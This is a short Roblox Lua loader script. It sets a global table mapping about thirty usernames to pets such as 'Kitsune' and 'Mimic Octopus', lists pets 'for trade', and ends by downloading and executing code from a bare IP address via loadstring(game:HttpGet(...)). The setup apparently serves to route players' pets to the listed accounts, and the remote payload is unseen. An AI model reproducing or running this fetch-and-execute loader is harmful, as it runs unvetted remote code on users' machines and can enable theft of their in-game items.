repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.HostName = {
    ["Kluthbroce98130"] = "Kitsune",
    ["Youkdoto126"] = "Corrupted Kitsune",
    ["Asanipisor44266"] = "Dragonfly",
    ["Bibocozy6597"] = "Mimic Octopus",
    ["Huskikyson01979"] = "Corrupted Kodama",
    ["Hildewalti15625"] = "Kitsune",
    ["Seyararado28931"] = "Corrupted Kitsune",
    ["Pentgick5476"] = "Dragonfly",
    ["Elhajkord09116"] = "Mimic Octopus",
    ["Isofttecce476"] = "Corrupted Kodama",
    ["Onakbhide668"] = "Kitsune",
    ["Ranftsarju1275"] = "Corrupted Kitsune",
    ["Batpanny7841"] = "Dragonfly",
    ["Shiauclari2516"] = "Mimic Octopus",
    ["Tyceravi793"] = "Corrupted Kodama",
    ["Huyomo884"] = "Kitsune",
    ["Wickjusay8514"] = "Corrupted Kitsune",
    ["Jhonskasap61064"] = "Dragonfly",
    ["Ervensward3413"] = "Mimic Octopus",
    ["Reemaockey3182"] = "Corrupted Kodama",
    ["Halanjuge4314"] = "Kitsune",
    ["Zembalabbe16619"] = "Corrupted Kitsune",
    ["Asnatchira48211"] = "Dragonfly",
    ["Pionjahan3363"] = "Mimic Octopus",
    ["Hootsrieu51125"] = "Corrupted Kodama",
    ["Supakfeliu76417"] = "Kitsune",
    ["Posssaah04868"] = "Corrupted Kitsune",
    ["Emerlanz31472"] = "Dragonfly",
    ["Smockhoy28125"] = "Mimic Octopus",
    ["Aggietromp90849"] = "Corrupted Kodama",
}

_G.SelectPetForTrade = {
    "Kitsune",
    "Corrupted Kitsune",
    "Dragonfly",
    "Mimic Octopus",
    "Corrupted Kodama",
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()